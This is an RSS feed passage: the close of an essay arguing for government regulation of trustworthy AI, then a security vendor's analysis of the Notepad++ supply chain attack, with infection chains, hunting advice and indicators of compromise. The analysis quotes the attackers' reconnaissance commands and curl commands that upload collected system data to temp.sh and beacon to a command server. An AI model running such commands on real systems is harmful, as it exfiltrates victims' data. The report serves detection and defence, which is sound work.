    &lt;p&gt;So far, we have been talking about one particular failure that results from overly trusting AI. We can call it something like “hidden exploitation.” There are others. There’s outright fraud, where the AI is actually trying to steal stuff from you. There’s the more prosaic mistaken expertise, where you think the AI is more knowledgeable than it is because it acts confidently. There’s incompetency, where you believe that the AI can do something it can’t. There’s inconsistency, where you mistakenly expect the AI to be able to repeat its behaviors. And there’s illegality, where you mistakenly trust the AI to obey the law. There are probably more ways trusting an AI can fail.&lt;/p&gt;
    &lt;p&gt;All of this is a long-winded way of saying that we need trustworthy AI. AI whose behavior, limitations, and training are understood. AI whose biases are understood, and corrected for. AI whose goals are understood. That won’t secretly betray your trust to someone else.&lt;/p&gt;
    &lt;p&gt;The market will not provide this on its own. Corporations are profit maximizers, at the expense of society. And the incentives of surveillance capitalism are just too much to resist.&lt;/p&gt;
    &lt;p&gt;It’s government that provides the underlying mechanisms for the social trust essential to society. Think about contract law. Or laws about property, or laws protecting your personal safety. Or any of the health and safety codes that let you board a plane, eat at a restaurant, or buy a pharmaceutical without worry.&lt;/p&gt;
    &lt;p&gt;The more you can trust that your societal interactions are reliable and predictable, the more you can ignore their details. Places where governments don’t provide these things are not good places to live.&lt;/p&gt;
    &lt;p&gt;Government can do this with AI. We need AI transparency laws. When it is used. How it is trained. What biases and tendencies it has. We need laws regulating AI—and robotic—safety. When it is permitted to affect the world. We need laws that enforce the trustworthiness of AI. Which means the ability to recognize when those laws are being broken. And penalties sufficiently large to incent trustworthy behavior.&lt;/p&gt;
    &lt;p&gt;Many countries are contemplating AI safety and security laws—the EU is the furthest along—but I think they are making a critical mistake. They try to regulate the AIs and not the humans behind them.&lt;/p&gt;
    &lt;p&gt;AIs are not people; they don’t have agency. They are built by, trained by, and controlled by people. Mostly for-profit corporations. Any AI regulations should place restrictions on those people and corporations. Otherwise the regulations are making the same category error I’ve been talking about. At the end of the day, there is always a human responsible for whatever the AI’s behavior is. And it’s the human who needs to be responsible for what they do—and what their companies do. Regardless of whether it was due to humans, or AI, or a combination of both. Maybe that won’t be true forever, but it will be true in the near future. If we want trustworthy AI, we need to require trustworthy AI controllers.&lt;/p&gt;
    &lt;p&gt;We already have a system for this: fiduciaries. There are areas in society where trustworthiness is of paramount importance, even more than usual. Doctors, lawyers, accountants…these are all trusted agents. They need extraordinary access to our information and ourselves to do their jobs, and so they have additional legal responsibilities to act in our best interests. They have fiduciary responsibility to their clients.&lt;/p&gt;
    &lt;p&gt;We need the same sort of thing for our data. The idea of a data fiduciary is not new. But it’s even more vital in a world of generative AI assistants.&lt;/p&gt;
    &lt;p&gt;And we need one final thing: public AI models. These are systems built by academia, or non-profit groups, or government itself, that can be owned and run by individuals.&lt;/p&gt;
    &lt;p&gt;The term “public model” has been thrown around a lot in the AI world, so it’s worth detailing what this means. It’s not a corporate AI model that the public is free to use. It’s not a corporate AI model that the government has licensed. It’s not even an open-source model that the public is free to examine and modify.&lt;/p&gt;
    &lt;p&gt;A public model is a model built by the public for the public. It requires political accountability, not just market accountability. This means openness and transparency paired with a responsiveness to public demands. It should also be available for anyone to build on top of. This means universal access. And a foundation for a free market in AI innovations. This would be a counter-balance to corporate-owned AI.&lt;/p&gt;
    &lt;p&gt;We can never make AI into our friends. But we can make them into trustworthy services—agents and not double agents. But only if government mandates it. We can put limits on surveillance capitalism. But only if government mandates it.&lt;/p&gt;
    &lt;p&gt;Because the point of government is to create social trust. I started this talk by explaining the importance of trust in society, and how interpersonal trust doesn’t scale to larger groups. That other, impersonal kind of trust—social trust, reliability and predictability—is what governments create.&lt;/p&gt;
    &lt;p&gt;To the extent a government improves the overall trust in society, it succeeds. And to the extent a government doesn’t, it fails.&lt;/p&gt;
    &lt;p&gt;But they have to. We need government to constrain the behavior of corporations and the AIs they build, deploy, and control. Government needs to enforce both predictability and reliability.&lt;/p&gt;
    &lt;p&gt;That’s how we can create the social trust that society needs to thrive.&lt;/p&gt;
    &lt;p&gt;This essay previously appeared on the Harvard Kennedy School Belfer Center’s website.&lt;/p&gt;
    &lt;p&gt;EDITED TO ADD: This essay has been translated into German.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46877075</guid><pubDate>Tue, 03 Feb 2026 20:49:30 +0000</pubDate></item><item><title>FlashAttention-T: Towards Tensorized Attention</title><link>https://dl.acm.org/doi/10.1145/3774934.3786425</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46877403</guid><pubDate>Tue, 03 Feb 2026 21:15:48 +0000</pubDate></item><item><title>Notepad++ supply chain attack breakdown</title><link>https://securelist.com/notepad-supply-chain-attack/118708/</link><description>&lt;doc fingerprint="bde39993f10d8e27"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;On February 2, 2026, the developers of Notepad++, a text editor popular among developers, published a statement claiming that the update infrastructure of Notepad++ has been compromised. According to the statement, this was due to a hosting provider level incident, which occurred from June to September 2025. However, attackers were able to retain access to internal services until December 2025.&lt;/p&gt;
    &lt;head rend="h2"&gt;Multiple execution chains and payloads&lt;/head&gt;
    &lt;p&gt;Having checked our telemetry related to this incident, we have been amazed to find out how different and unique were the execution chains used in this supply chain attack. We identified that over the course of four months, from July to October 2025, attackers who have compromised Notepad++ have been constantly rotating C2 server addresses used for distributing malicious updates, the downloaders used for implant delivery, as well as the final payloads.&lt;/p&gt;
    &lt;p&gt;We observed three different infection chains overall designed to attack about a dozen machines, belonging to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Individuals located in Vietnam, El Salvador and Australia;&lt;/item&gt;
      &lt;item&gt;A government organization located in the Philippines;&lt;/item&gt;
      &lt;item&gt;A financial organization located in El Salvador;&lt;/item&gt;
      &lt;item&gt;An IT service provider organization located in Vietnam.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Despite the variety of payloads observed, Kaspersky solutions have been able to block the identified attacks as they occurred.&lt;/p&gt;
    &lt;p&gt;In this article, we describe the variety of the infection chains we observed in the Notepad++ supply chain attack, as well as provide numerous previously unpublished IoCs related to it.&lt;/p&gt;
    &lt;head rend="h3"&gt;Chain #1 — late July and early August 2025&lt;/head&gt;
    &lt;p&gt;We observed attackers to deploy a malicious Notepad++ update for the first time in late July 2025. It was hosted at http://45.76.155[.]202/update/update.exe. Notably, the first scan of this URL on the VirusTotal platform occurred in late September, by a user from Taiwan.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;update.exe&lt;/code&gt; file downloaded from this URL (SHA1: 8e6e505438c21f3d281e1cc257abdbf7223b7f5a) was launched by the legitimate Notepad++ updater process, &lt;code&gt;GUP.exe&lt;/code&gt;. This file turned out to be a NSIS installer, of about 1 MB in size. When started, it sends a heartbeat containing system information to the attackers. This is done through the following steps:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The file creates a directory named &lt;code&gt;%appdata%\ProShow&lt;/code&gt;and sets it as the current directory;&lt;/item&gt;
      &lt;item&gt;It executes the shell command &lt;code&gt;cmd /c whoami&amp;amp;&amp;amp;tasklist &amp;gt; 1.txt&lt;/code&gt;, thus creating a file with the shell command execution results in the&lt;code&gt;%appdata%\ProShow&lt;/code&gt;directory;&lt;/item&gt;
      &lt;item&gt;Then it uploads the &lt;code&gt;1.txt&lt;/code&gt;file to the temp[.]sh hosting service by executing the&lt;code&gt;curl.exe -F "file=@1.txt" -s https://temp.sh/upload&lt;/code&gt;command;&lt;/item&gt;
      &lt;item&gt;Next, it sends the URL to the uploaded &lt;code&gt;1.txt&lt;/code&gt;file by using the&lt;code&gt;curl.exe --user-agent "https://temp.sh/ZMRKV/1.txt" -s http://45.76.155[.]202&lt;/code&gt;shell command. As can be observed, the uploaded file URL is transferred inside the user agent.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Notably, the same behavior of malicious Notepad++ updates, specifically the launch of shell commands and the use of the temp[.]sh website for file uploading, has been described on the Notepad++ community forums by a user named soft-parsley.&lt;lb/&gt; After sending system information, the &lt;code&gt;update.exe&lt;/code&gt; file executes the second-stage payload. To do that, it performs the following actions: &lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Drops the following files to the &lt;code&gt;%appdata%\ProShow&lt;/code&gt;directory:&lt;list rend="ul"&gt;&lt;item&gt;&lt;code&gt;ProShow.exe&lt;/code&gt;(SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)&lt;/item&gt;&lt;item&gt;&lt;code&gt;defscr&lt;/code&gt;(SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)&lt;/item&gt;&lt;item&gt;&lt;code&gt;if.dnt&lt;/code&gt;(SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)&lt;/item&gt;&lt;item&gt;&lt;code&gt;proshow.crs&lt;/code&gt;(SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)&lt;/item&gt;&lt;item&gt;&lt;code&gt;proshow.phd&lt;/code&gt;(SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)&lt;/item&gt;&lt;item&gt;&lt;code&gt;proshow_e.bmp&lt;/code&gt;(SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)&lt;/item&gt;&lt;item&gt;&lt;code&gt;load&lt;/code&gt;(SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Executes the dropped &lt;code&gt;ProShow.exe&lt;/code&gt;file.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The launched &lt;code&gt;ProShow.exe&lt;/code&gt; file is a legitimate ProShow software, which is abused to launch a malicious payload. Normally, when threat actors aim to execute a malicious payload inside a legitimate process, they resort to the DLL sideloading technique. However, this time attackers have decided to avoid using it — likely due to how much attention this technique receives nowadays. Instead, they abused an old, known vulnerability in the ProShow software, which dates back to early 2010s. The dropped file named &lt;code&gt;load&lt;/code&gt; contains an exploit payload, which is launched when the &lt;code&gt;ProShow.exe&lt;/code&gt; file is launched. It is worth noting that, apart from this payload, all files in the &lt;code&gt;%appdata%\ProShow&lt;/code&gt; directory are legitimate.&lt;/p&gt;
    &lt;p&gt;Analysis of the exploit payload revealed that it contains two shellcodes — one at the very start and the other one in the middle of the file. The shellcode located at the start of the file contains a set of meaningless instructions and is not designed to be executed — rather, attackers used it as the exploit padding bytes. It is likely that, by using a fake shellcode for padding bytes instead of something else (e.g., a sequence of &lt;code&gt;0x41&lt;/code&gt; characters or random bytes), attackers aimed to confuse researchers and automated analysis systems. &lt;/p&gt;
    &lt;p&gt;The second shellcode, which is stored in the middle of the file, is the one that is launched when &lt;code&gt;ProShow.exe&lt;/code&gt; is started. It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it. &lt;/p&gt;
    &lt;p&gt;The Cobalt Strike Beacon payload is designed to communicate with the cdncheck.it[.]com C2 server. For instance, it uses the GET request URL https://45.77.31[.]210/api/update/v1 and the POST request URL https://45.77.31[.]210/api/FileUpload/submit.&lt;/p&gt;
    &lt;p&gt;Later on, in early August 2025, we have observed attackers to use the same download URL for the &lt;code&gt;update.exe&lt;/code&gt; files (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates. However, we noted the following differences:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;&lt;/item&gt;
      &lt;item&gt;The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We have not further seen any infections leveraging chain #1 after early August 2025.&lt;/p&gt;
    &lt;head rend="h3"&gt;Chain #2 — middle and end of September 2025&lt;/head&gt;
    &lt;p&gt;A month and a half after malicious update detections ceased, we observed attackers to resume deploying these updates in the middle of September 2025, using another infection chain. The malicious update was still being distributed from the http://45.76.155[.]202/update/update.exe URL, and the file downloaded from it (SHA1 hash: 573549869e84544e3ef253bdba79851dcde4963a) was an NSIS installer as well. However, its file size was now about 140 KB. Again, this file performed two actions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Obtained system information by executing a shell command and uploading its execution results to temp[.]sh;&lt;/item&gt;
      &lt;item&gt;Dropped a next-stage payload on disk and launched it.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Regarding system information, attackers made the following changes to how it was collected:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;They changed the working directory to %APPDATA%\Adobe\Scripts;&lt;/item&gt;
      &lt;item&gt;They started collecting more system information details, changing the executed shell command to &lt;code&gt;cmd /c "whoami&amp;amp;&amp;amp;tasklist&amp;amp;&amp;amp;systeminfo&amp;amp;&amp;amp;netstat -ano" &amp;gt; a.txt&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The created &lt;code&gt;a.txt&lt;/code&gt; file was, just as in the case of stage #1, uploaded to the temp[.]sh website through curl, with the obtained temp[.]sh URL being transferred to the same http://45.76.155[.]202/list endpoint, inside the User-Agent header.&lt;/p&gt;
    &lt;p&gt;As for the next-stage payload, it has been changed completely. The NSIS installer was configured to drop the following files to the %APPDATA%\Adobe\Scripts directory:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;alien.dll&lt;/code&gt;(SHA1: 6444dab57d93ce987c22da66b3706d5d7fc226da);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;lua5.1.dll&lt;/code&gt;(SHA1: 2ab0758dda4e71aee6f4c8e4c0265a796518f07d);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;script.exe&lt;/code&gt;(SHA1: bf996a709835c0c16cce1015e6d44fc95e08a38a);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;alien.ini&lt;/code&gt;(SHA1: ca4b6fe0c69472cd3d63b212eb805b7f65710d33).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Next, it executes the following shell command to launch the script.exe file: &lt;code&gt;%APPDATA%\%Adobe\Scripts\script.exe %APPDATA%\Adobe\Scripts\alien.ini&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;All of the files in the &lt;code&gt;%APPDATA%\Adobe\Scripts&lt;/code&gt; directory, except for &lt;code&gt;alien.ini&lt;/code&gt;, are legitimate and related to the Lua interpreter. As such, the previously mentioned command is used by attackers to launch a compiled Lua script, located in the &lt;code&gt;alien.ini&lt;/code&gt; file.  Below is a screenshot of its decompilation:&lt;lb/&gt; As we can see, this small script is used for placing shellcode inside executable memory and then launching it through the &lt;code&gt;EnumWindowStationsW&lt;/code&gt; API function.&lt;/p&gt;
    &lt;p&gt;The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the https://cdncheck.it[.]com/users/admin URL.&lt;/p&gt;
    &lt;p&gt;The Cobalt Strike payload contains the C2 server URLs that slightly differ from the ones seen previously: https://cdncheck.it[.]com/api/getInfo/v1 and https://cdncheck.it[.]com/api/FileUpload/submit.&lt;/p&gt;
    &lt;p&gt;Attacks involving chain #2 continued until the end of September, when we observed two more malicious &lt;code&gt;update.exe&lt;/code&gt; files. One of them had the SHA1 hash 13179c8f19fbf3d8473c49983a199e6cb4f318f0. The Cobalt Strike Beacon payload delivered through it was configured to use the same URLs observed in mid-September, however, attackers changed the way system information was collected. Specifically, attackers split the single shell command they used for this (&lt;code&gt;cmd /c "whoami&amp;amp;&amp;amp;tasklist&amp;amp;&amp;amp;systeminfo&amp;amp;&amp;amp;netstat -ano" &amp;gt; a.txt&lt;/code&gt;) into multiple commands:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;cmd /c whoami &amp;gt;&amp;gt; a.txt&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;cmd /c tasklist &amp;gt;&amp;gt; a.txt&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;cmd /c systeminfo &amp;gt;&amp;gt; a.txt&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;cmd /c netstat -ano &amp;gt;&amp;gt; a.txt&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Notably, the same sequence of commands has been previously documented by the soft-parsley user on the Notepad++ community forums.&lt;/p&gt;
    &lt;p&gt;The other &lt;code&gt;update.exe&lt;/code&gt; file had the SHA1 hash 4c9aac447bf732acc97992290aa7a187b967ee2c. Using it, attackers performed the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Changed the system information upload URL to https://self-dns.it[.]com/list;&lt;/item&gt;
      &lt;item&gt;Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;&lt;/item&gt;
      &lt;item&gt;Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;&lt;/item&gt;
      &lt;item&gt;Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Chain #3 — October 2025&lt;/head&gt;
    &lt;p&gt;In early October 2025, attackers changed the infection chain once again. They have as well changed the C2 server for distributing malicious updates, with the observed update URL being http://45.32.144[.]255/update/update.exe. The payload downloaded (SHA1: d7ffd7b588880cf61b603346a3557e7cce648c93) was still a NSIS installer, however, unlike in the case of chains 1 and 2, this installer did not include the system information sending functionality. It simply dropped the following files to the &lt;code&gt;%appdata%\Bluetooth\&lt;/code&gt; directory:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;BluetoothService.exe&lt;/code&gt;, a legitimate executable (SHA1: 21a942273c14e4b9d3faa58e4de1fd4d5014a1ed);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;log.dll&lt;/code&gt;, a malicious DLL (SHA1: f7910d943a013eede24ac89d6388c1b98f8b3717);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;BluetoothService&lt;/code&gt;, an encrypted shellcode (SHA1: 7e0790226ea461bcc9ecd4be3c315ace41e1c122).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This execution chain relies on the sideloading of the &lt;code&gt;log.dll&lt;/code&gt; file, which is responsible for launching the encrypted &lt;code&gt;BluetoothService&lt;/code&gt; shellcode into the &lt;code&gt;BluetoothService.exe&lt;/code&gt; process. Notably, such execution chains are commonly used by Chinese-speaking threat actors. This particular execution chain has already been described by Rapid7, and the final payload observed in it is the custom Chrysalis backdoor. &lt;/p&gt;
    &lt;p&gt;Unlike the previous chains, chain #3 does not load a Cobalt Strike Beacon directly. However, in their article Rapid7 claim that they additionally observed a Cobalt Strike Beacon payload being deployed to the &lt;code&gt;C:\ProgramData\USOShared&lt;/code&gt; folder, while conducting incident response on one of the machines infected with the Notepad++ supply chain attack. Whilst Rapid7 does not detail how this file was dropped to the victim machine, we can highlight the following similarities between that Beacon payload and the Beacon payloads observed in chains #1 and #2:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;In both cases, Beacons are loaded through a Metasploit downloader shellcode, with similar URLs used (api.wiresguard.com/users/admin for the Rapid7 payload, cdncheck.it.com/users/admin and http://45.77.31[.]210/users/admin for chain #1 and chain #2 payloads);&lt;/item&gt;
      &lt;item&gt;The Beacon configurations are encrypted with the XOR key &lt;code&gt;CRAZY&lt;/code&gt;;&lt;/item&gt;
      &lt;item&gt;Similar C2 server URLs are used for Cobalt Strike Beacon communications (i.e. api.wiresguard.com/api/FileUpload/submit for the Rapid7 payload and https://45.77.31[.]210/api/FileUpload/submit for the chain #1 payload).&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Return of chain #2 and changes in URLs — October 2025&lt;/head&gt;
    &lt;p&gt;In mid-October 2025, we observed attackers to resume deployments of the chain #2 payload (SHA1 hash: 821c0cafb2aab0f063ef7e313f64313fc81d46cd) using yet another URL: http://95.179.213[.]0/update/update.exe. Still, this payload used the previously mentioned self-dns.it[.]com and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications.&lt;/p&gt;
    &lt;p&gt;Further in late October 2025, we observed attackers to start changing URLs used for malicious update deliveries. Specifically, attackers started using the following URLs:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;http://95.179.213[.]0/update/install.exe;&lt;/item&gt;
      &lt;item&gt;http://95.179.213[.]0/update/update.exe;&lt;/item&gt;
      &lt;item&gt;http://95.179.213[.]0/update/AutoUpdater.exe.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We haven’t observed any new payloads deployed from these URLs — they involved usage of both #2 and #3 execution chains. Finally, we have not seen any payloads being deployed starting from November 2025.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Notepad++ is a text editor used by numerous developers. As such, the ability to control update servers of this software gave attackers a unique possibility to break into machines of high-profile organizations around the world. The attackers made an effort to avoid losing access to this infection vector — they were spreading the malicious implants in a targeted manner, and they were skilled enough to drastically change the infection chains about once a month. Whilst we identified three distinct infection chains during our investigation, we would not be surprised to see more of them in use. To sum up our findings, here is the overall timeline of the infection chains that we identified:&lt;lb/&gt; The variety of infection chains makes detection of the Notepad++ supply chain attack quite a difficult and at the same time creative task. We would like to propose the following methods, from generic to specific, to hunt down traces of this attack:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check systems for deployments of NSIS installers, which have been used in all three observed execution chains. For example, this can be done by looking for logs related to creations of the &lt;code&gt;%localappdata%\Temp\ns.tmp&lt;/code&gt;directory, made by NSIS installers at runtime. Make sure to investigate the origins of each identified NSIS installer to avoid false positives;&lt;/item&gt;
      &lt;item&gt;Check network traffic logs for DNS resolutions of the temp[.]sh domain, which is unusual to observe in corporate environments. Also, it is beneficial to conduct a check for raw HTTP traffic requests that have a temp[.]sh URL embedded in the user agent — both these steps will make it possible to detect chain #1 and chain #2 deployments;&lt;/item&gt;
      &lt;item&gt;Check systems for launches of malicious shell commands referenced in the article, such as &lt;code&gt;whoami&lt;/code&gt;,&lt;code&gt;tasklist&lt;/code&gt;,&lt;code&gt;systeminfo&lt;/code&gt;and&lt;code&gt;netstat -ano&lt;/code&gt;;&lt;/item&gt;
      &lt;item&gt;Use specific IoCs listed below to identify known malicious domains and files.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Indicators of compromise&lt;/head&gt;
    &lt;p&gt;URLs used for malicious Notepad++ update deployments&lt;lb/&gt; http://45.76.155[.]202/update/update.exe&lt;lb/&gt; http://45.32.144[.]255/update/update.exe&lt;lb/&gt; http://95.179.213[.]0/update/update.exe&lt;lb/&gt; http://95.179.213[.]0/update/install.exe&lt;lb/&gt; http://95.179.213[.]0/update/AutoUpdater.exe&lt;/p&gt;
    &lt;p&gt;System information upload URLs&lt;lb/&gt; http://45.76.155[.]202/list&lt;lb/&gt; https://self-dns.it[.]com/list&lt;/p&gt;
    &lt;p&gt;URLs used by Metasploit downloaders to deploy Cobalt Strike beacons&lt;lb/&gt; https://45.77.31[.]210/users/admin&lt;lb/&gt; https://cdncheck.it[.]com/users/admin&lt;lb/&gt; https://safe-dns.it[.]com/help/Get-Start&lt;/p&gt;
    &lt;p&gt;URLs used by Cobalt Strike Beacons delivered by malicious Notepad++ updaters&lt;lb/&gt; https://45.77.31[.]210/api/update/v1&lt;lb/&gt; https://45.77.31[.]210/api/FileUpload/submit&lt;lb/&gt; https://cdncheck.it[.]com/api/update/v1&lt;lb/&gt; https://cdncheck.it[.]com/api/Metadata/submit&lt;lb/&gt; https://cdncheck.it[.]com/api/getInfo/v1&lt;lb/&gt; https://cdncheck.it[.]com/api/FileUpload/submit&lt;lb/&gt; https://safe-dns.it[.]com/resolve&lt;lb/&gt; https://safe-dns.it[.]com/dns-query&lt;/p&gt;
    &lt;p&gt;URLs used by the Chrysalis backdoor and the Cobalt Strike Beacon payloads associated with it, as previously identified by Rapid7&lt;lb/&gt; https://api.skycloudcenter[.]com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821&lt;lb/&gt; https://api.wiresguard[.]com/update/v1&lt;lb/&gt; https://api.wiresguard[.]com/api/FileUpload/submit&lt;/p&gt;
    &lt;p&gt;URLs related to Cobalt Strike Beacons uploaded to multiscanners, as previously identified by Rapid7&lt;lb/&gt; http://59.110.7[.]32:8880/uffhxpSy&lt;lb/&gt; http://59.110.7[.]32:8880/api/getBasicInfo/v1&lt;lb/&gt; http://59.110.7[.]32:8880/api/Metadata/submit&lt;lb/&gt; http://124.222.137[.]114:9999/3yZR31VK&lt;lb/&gt; http://124.222.137[.]114:9999/api/updateStatus/v1&lt;lb/&gt; http://124.222.137[.]114:9999/api/Info/submit&lt;lb/&gt; https://api.wiresguard[.]com/users/system&lt;lb/&gt; https://api.wiresguard[.]com/api/getInfo/v1&lt;/p&gt;
    &lt;p&gt;Malicious updater.exe hashes&lt;lb/&gt; 8e6e505438c21f3d281e1cc257abdbf7223b7f5a&lt;lb/&gt; 90e677d7ff5844407b9c073e3b7e896e078e11cd&lt;lb/&gt; 573549869e84544e3ef253bdba79851dcde4963a&lt;lb/&gt; 13179c8f19fbf3d8473c49983a199e6cb4f318f0&lt;lb/&gt; 4c9aac447bf732acc97992290aa7a187b967ee2c&lt;lb/&gt; 821c0cafb2aab0f063ef7e313f64313fc81d46cd&lt;/p&gt;
    &lt;p&gt;Hashes of malicious auxiliary files&lt;lb/&gt; 06a6a5a39193075734a32e0235bde0e979c27228 — load&lt;lb/&gt; 9c3ba38890ed984a25abb6a094b5dbf052f22fa7 — load&lt;lb/&gt; ca4b6fe0c69472cd3d63b212eb805b7f65710d33 — alien.ini&lt;lb/&gt; 0d0f315fd8cf408a483f8e2dd1e69422629ed9fd — alien.ini&lt;lb/&gt; 2a476cfb85fbf012fdbe63a37642c11afa5cf020 — alien.ini&lt;/p&gt;
    &lt;p&gt;Malicious file hashes, as previously identified by Rapid7&lt;lb/&gt; d7ffd7b588880cf61b603346a3557e7cce648c93&lt;lb/&gt; 94dffa9de5b665dc51bc36e2693b8a3a0a4cc6b8&lt;lb/&gt; 21a942273c14e4b9d3faa58e4de1fd4d5014a1ed&lt;lb/&gt; 7e0790226ea461bcc9ecd4be3c315ace41e1c122&lt;lb/&gt; f7910d943a013eede24ac89d6388c1b98f8b3717&lt;lb/&gt; 73d9d0139eaf89b7df34ceeb60e5f8c7cd2463bf&lt;lb/&gt; bd4915b3597942d88f319740a9b803cc51585c4a&lt;lb/&gt; c68d09dd50e357fd3de17a70b7724f8949441d77&lt;lb/&gt; 813ace987a61af909c053607635489ee984534f4&lt;lb/&gt; 9fbf2195dee991b1e5a727fd51391dcc2d7a4b16&lt;lb/&gt; 07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51&lt;lb/&gt; 3090ecf034337857f786084fb14e63354e271c5d&lt;lb/&gt; d0662eadbe5ba92acbd3485d8187112543bcfbf5&lt;lb/&gt; 9c0eff4deeb626730ad6a05c85eb138df48372ce&lt;/p&gt;
    &lt;p&gt;Malicious file paths&lt;lb/&gt; %appdata%\ProShow\load&lt;lb/&gt; %appdata%\Adobe\Scripts\alien.ini&lt;lb/&gt; %appdata%\Bluetooth\BluetoothService&lt;/p&gt;
    &lt;p&gt;The Notepad++ supply chain attack — unnoticed execution chains and new IoCs&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46878338</guid><pubDate>Tue, 03 Feb 2026 22:35:27 +0000</pubDate></item></channel></rss>